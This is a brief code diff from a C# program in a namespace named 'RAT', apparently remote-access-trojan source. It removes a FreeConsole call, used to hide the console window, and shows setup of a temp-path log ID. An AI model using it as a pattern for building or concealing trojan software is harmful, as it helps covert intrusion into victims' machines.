@@ -70,11 +70,9 @@ namespace RAT
         {
             Path.GetTempPath()+SystemID
         };
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern bool FreeConsole();
+
         static void Main(string[] args)
         {
-            // FreeConsole();
             SystemID = "LOG_"+uid();
             try
             {
